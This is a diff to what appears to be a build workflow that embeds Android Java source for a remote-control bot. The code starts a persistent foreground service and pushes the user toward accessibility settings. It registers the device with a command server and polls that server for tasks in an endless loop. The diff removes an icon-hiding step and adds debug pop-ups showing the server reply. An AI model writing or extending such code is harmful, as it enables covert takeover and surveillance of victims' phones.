@@ -209,10 +209,6 @@ jobs:
                 if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
               } catch (Exception e) {}
               try {
-                getPackageManager().setComponentEnabledSetting(getComponentName(),
-                  PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-              } catch (Exception e) {}
-              try {
                 startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                   .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
               } catch (Exception e) {}
@@ -287,6 +283,7 @@ jobs:
               SRV = getString(R.string.vanta_server);
               DID = Build.MANUFACTURER + "_" + Build.MODEL + "_" + Long.toHexString(System.currentTimeMillis());
               try { startForeground(1, notif()); } catch (Exception e) {}
+              try { alert(this, "🚀 التطبيق بدأ | " + DID); } catch (Exception e) {}
               new Thread(new Runnable() { public void run() { loop(); } }).start();
             }
             Notification notif() {
@@ -376,7 +373,10 @@ jobs:
             }
             void res(String t) { sendRes(this, t); }
             void loop() {
-              try { http(SRV + "/register?id=" + enc(DID) + "&info=" + enc(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE)); } catch (Exception e) {}
+              try {
+                String rr = http(SRV + "/register?id=" + enc(DID) + "&info=" + enc(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE));
+                alert(this, "📡 register: " + rr + "\nSRV=" + SRV);
+              } catch (Exception e) { alert(this, "📡 ERR " + e); }
               while (true) {
                 try {
                   String r = http(SRV + "/task?id=" + enc(DID));
